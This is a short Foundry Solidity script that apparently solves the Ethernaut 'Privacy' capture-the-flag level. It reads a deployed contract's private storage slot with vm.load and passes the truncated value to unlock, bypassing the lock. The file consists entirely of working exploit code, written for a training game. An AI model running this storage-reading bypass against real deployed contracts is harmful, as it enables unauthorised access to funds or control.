pragma solidity ^0.8.25;

import {Script, console} from "forge-std/Script.sol";
import {Privacy} from "../../src/Ethernaut/Privacy.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Privacy privacy = Privacy(0x7A544c4c0Ca3360EBe10A377743739D23D5C2c14);

        bytes32 data = vm.load(address(privacy), bytes32(uint256(5)));
        privacy.unlock(bytes16(data));

        vm.stopBroadcast();
    }
}
